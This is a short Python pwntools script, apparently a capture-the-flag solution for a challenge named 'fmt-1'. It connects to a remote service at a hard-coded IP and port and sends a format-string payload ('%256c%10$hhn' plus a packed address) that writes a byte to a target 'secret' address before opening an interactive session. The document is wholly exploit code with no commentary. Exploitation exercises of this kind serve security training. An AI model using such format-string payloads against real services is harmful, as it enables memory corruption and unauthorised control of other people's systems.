from pwn import *

ip = "140.110.112.77"
port = 4002

r = remote(ip, port)
# r = process("./fmt-1")

context.arch = "amd64"

secret = 0x404050

payload = b"%256c%10$hhn".ljust(0x10) + flat(secret)

r.sendafter(":", payload)
r.sendafter(":", "\x00")

r.interactive()
